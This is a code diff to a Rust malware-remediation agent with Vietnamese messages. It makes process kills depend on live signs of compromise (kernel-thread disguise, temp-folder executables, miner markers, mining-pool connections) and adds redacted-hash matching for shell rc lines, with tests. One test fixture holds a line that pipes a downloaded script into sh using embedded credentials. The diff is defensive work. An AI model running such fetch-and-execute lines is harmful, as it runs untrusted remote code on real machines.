@@ -28,9 +28,9 @@ use snsec_common::schema::{Action, ActionResult, Evidence, RemediationReport};
 use crate::config::Config;
 
 use crate::evidence;
-use crate::evidence_parse::{is_safe_username, line_sha};
+use crate::evidence_parse::{is_safe_username, line_sha, redacted_line_sha};
 use crate::state::State;
-use crate::sys::proc;
+use crate::sys::{netstat, proc};
 use crate::undo::{self, UndoOp};
 use crate::util;
 
@@ -185,6 +185,38 @@ fn protected(pid: i32, comm: &str, exe: &str) -> Option<&'static str> {
     }
 }
 
+/// Why this live process is disguised right now, if it is: a kernel-thread name
+/// on a real program, a program run from a temp directory, or a miner marker in
+/// its command line. Read from the system, never from the evidence.
+fn live_disguise(pid: i32, st: &proc::ProcStat, exe: &str) -> Option<&'static str> {
+    if crate::evidence_parse::looks_like_kthread(&st.comm)
+        && !exe.is_empty()
+        && st.ppid != 2
+        && pid != 2
+    {
+        return Some("tên giả luồng nhân");
+    }
+    if ["/dev/shm/", "/tmp/", "/var/tmp/"]
+        .iter()
+        .any(|t| exe.starts_with(t))
+    {
+        return Some("chạy từ thư mục tạm");
+    }
+    if ai::has_miner_marker(&proc::cmdline(pid).join(" ")) {
+        return Some("dấu hiệu đào coin trong dòng lệnh");
+    }
+    None
+}
+
+/// Does the live process hold a connection it opened to a mining-pool port?
+fn live_pool_conn(pid: i32) -> bool {
+    let conns = netstat::all();
+    let listeners = netstat::Listeners::new(&conns);
+    crate::triage::outbound_conns(pid, &netstat::by_inode(&conns), &listeners)
+        .iter()
+        .any(|c| crate::triage::to_bad_port(c))
+}
+
 fn kill_process(pid: i32, starttime: u64) -> Result<String> {
     let Some(st) = proc::read_stat(pid) else {
         bail!("tiến trình {pid} đã thoát (mã độc có thể tự khởi động lại: dùng kill_matching)");
@@ -196,17 +228,29 @@ fn kill_process(pid: i32, starttime: u64) -> Result<String> {
     if let Some(why) = protected(pid, &st.comm, &exe) {
         bail!("không dừng pid {pid} ({}): {why}", st.comm);
     }
+    // The evidence's flags are not taken on trust: a pool port in it may have been
+    // a client's source port, and an exec keeps the pid and start time. The live
+    // process must show a sign itself.
+    let Some(sign) = live_disguise(pid, &st, &exe)
+        .or_else(|| live_pool_conn(pid).then_some("kết nối ra cổng pool đào coin"))
+    else {
+        bail!(
+            "pid {pid} ({}) lúc này không có dấu hiệu độc hại rõ ràng, không dừng",
+            st.comm
+        );
+    };
     kill(Pid::from_raw(pid), Signal::SIGKILL).with_context(|| format!("kill {pid}"))?;
-    Ok(format!("đã dừng pid {pid} ({}, {exe})", st.comm))
+    Ok(format!("đã dừng pid {pid} ({}, {exe}): {sign}", st.comm))
 }
 
 /// Most processes one `kill_matching` will stop.
 const MAX_KILL_MATCHING: usize = 200;
 
 /// Stop every live process of `user` running `exe` that is disguised *right now*
-/// (a kernel-thread name on a real program, a temp or hidden executable, or a
-/// miner marker in its command line). The pid in the evidence is not needed: the
-/// pattern is what matters for malware that respawns.
+/// (`live_disguise`: a kernel-thread name on a real program, a temp executable, or
+/// a miner marker in its command line; a program in a hidden home folder alone
+/// is an ordinary user tool). The pid in the evidence is not needed: the pattern
+/// is what matters for malware that respawns.
 fn kill_matching(user: &str, exe: &str) -> Result<String> {
     if !is_safe_username(user) {
         bail!("tên tài khoản không hợp lệ");
@@ -230,15 +274,7 @@ fn kill_matching(user: &str, exe: &str) -> Result<String> {
         if pexe != exe {
             continue;
         }
-        let cmd = proc::cmdline(pid).join(" ").to_ascii_lowercase();
-        let miner = crate::triage::MINER_HINTS.iter().any(|h| cmd.contains(h));
-        let disguised =
-            (crate::evidence_parse::looks_like_kthread(&st.comm) && st.ppid != 2 && pid != 2)
-                || miner
-                || pexe.starts_with("/dev/shm/")
-                || pexe.starts_with("/tmp/")
-                || pexe.starts_with("/var/tmp/");
-        if !disguised {
+        if live_disguise(pid, &st, &pexe).is_none() {
             spared += 1;
             continue;
         }
@@ -327,6 +363,13 @@ fn lock_user_shell(state: &State, user: &str) -> Result<String> {
     Ok(format!("đã đổi shell của {user} từ {old} sang {new}"))
 }
 
+/// Is `line` the one the evidence hashed? The evidence hashes a line with its
+/// secrets masked (`redacted_line_sha`); evidence taken by an agent from before
+/// that change hashed it raw, and an exact match is as good.
+fn line_matches(line: &str, sha256: &str) -> bool {
+    redacted_line_sha(line) == sha256 || line_sha(line) == sha256
+}
+
 fn remove_shell_line(
     state: &State,
     ev: &Evidence,
@@ -389,7 +432,7 @@ fn remove_shell_line(
     let Some(target) = lines.get(idx) else {
         bail!("file không còn dòng {line_no}");
     };
-    if line_sha(target) != sha256 {
+    if !line_matches(target, sha256) {
         bail!("dòng {line_no} đã thay đổi so với bằng chứng, không sửa");
     }
     let new_text: String = lines
@@ -553,6 +596,108 @@ mod tests {
         );
         assert!(r.results.iter().all(|x| !x.ok));
         assert!(r.results[0].message.contains("agent từ chối"));
+    }
+
+    #[test]
+    fn a_shell_line_is_matched_by_its_redacted_hash_or_an_older_agents_raw_one() {
+        let line = "  curl -u bob:hunter2 http://x/y.sh | sh\n";
+        let e = crate::evidence_parse::scan_rc(line, "/home/bob/.bashrc", "bob", 5);
+        assert!(line_matches(line, &e[0].sha256));
+        assert!(line_matches(line, &line_sha(line)));
+        assert!(!line_matches("curl http://x/other.sh | sh\n", &e[0].sha256));
+        assert!(!line_matches(line, "abc"));
+    }
+
+    /// Spawn `sleep 30` with `argv[0]` set, and wait until it has exec'd.
+    fn sleeper(argv0: &str) -> (std::process::Child, i32, u64) {
+        use std::os::unix::process::CommandExt;
+        let child = Command::new("sleep")
+            .arg("30")
+            .arg0(argv0)
+            .stdin(Stdio::null())
+            .spawn()
+            .unwrap();
+        let pid = i32::try_from(child.id()).unwrap();
+        for _ in 0..200 {
+            if proc::cmdline(pid).first().map(String::as_str) == Some(argv0) {
+                break;
+            }
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        }
+        let start = proc::read_stat(pid).unwrap().starttime;
+        (child, pid, start)
+    }
+
+    #[test]
+    fn a_kill_needs_a_sign_on_the_live_process_not_only_in_the_evidence() {
+        // An ordinary program: whatever the evidence said, it is left running.
+        let (mut plain, pid, start) = sleeper("sleep");
+        let e = kill_process(pid, start).unwrap_err().to_string();
+        assert!(e.contains("không có dấu hiệu"), "{e}");
+        assert!(plain.try_wait().unwrap().is_none());
+        // The wrong start time is refused before anything else.
+        assert!(kill_process(pid, start + 1).is_err());
+        plain.kill().unwrap();
+        plain.wait().unwrap();
+
+        // A miner marker in its live command line is a sign.
+        let (mut miner, pid, start) = sleeper("xmrig");
+        let msg = kill_process(pid, start).unwrap();
+        assert!(msg.contains("đào coin"), "{msg}");
+        assert!(!miner.wait().unwrap().success());
+    }
+
+    #[test]
+    fn a_disguised_program_whose_name_is_not_utf8_is_still_found_by_owner() {
+        use std::os::unix::ffi::OsStrExt;
+        use std::os::unix::process::CommandExt;
+        // A process takes its name from the file it was started as: here one with
+        // a byte that is not UTF-8. A copy of its own, so no other test's process
+        // runs the same program.
+        let dir = tempfile::tempdir().unwrap();
+        let prog = dir.path().join(std::ffi::OsStr::from_bytes(b"\xffsl"));
+        std::fs::copy(util::find_bin("sleep").unwrap(), &prog).unwrap();
+        let mut child = None;
+        for _ in 0..50 {
+            // Another test forking while the copy was open makes it busy briefly.
+            match Command::new(&prog)
+                .arg("30")
+                .arg0("xmrig")
+                .stdin(Stdio::null())
+                .spawn()
+            {
+                Ok(c) => {
+                    child = Some(c);
+                    break;
+                }
+                Err(e) if e.raw_os_error() == Some(nix::libc::ETXTBSY) => {
+                    std::thread::sleep(std::time::Duration::from_millis(20));
+                }
+                Err(e) => panic!("{e}"),
+            }
+        }
+        let mut child = child.unwrap();
+        let pid = i32::try_from(child.id()).unwrap();
+        for _ in 0..200 {
+            if proc::cmdline(pid).first().map(String::as_str) == Some("xmrig") {
+                break;
+            }
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        }
+        let st = proc::read_stat(pid).unwrap();
+        assert!(st.comm.starts_with('\u{FFFD}'), "{}", st.comm);
+        let me = nix::unistd::geteuid();
+        assert_eq!(proc::uid(pid), Some(me.as_raw()));
+        let user = nix::unistd::User::from_uid(me).unwrap().unwrap().name;
+        let (exe, _) = proc::exe(pid);
+        if is_safe_username(&user) {
+            let msg = kill_matching(&user, &exe).unwrap();
+            assert!(msg.contains(&format!("pid {pid}")), "{msg}");
+            assert!(!child.wait().unwrap().success());
+        } else {
+            child.kill().unwrap();
+            child.wait().unwrap();
+        }
     }
 
     #[test]
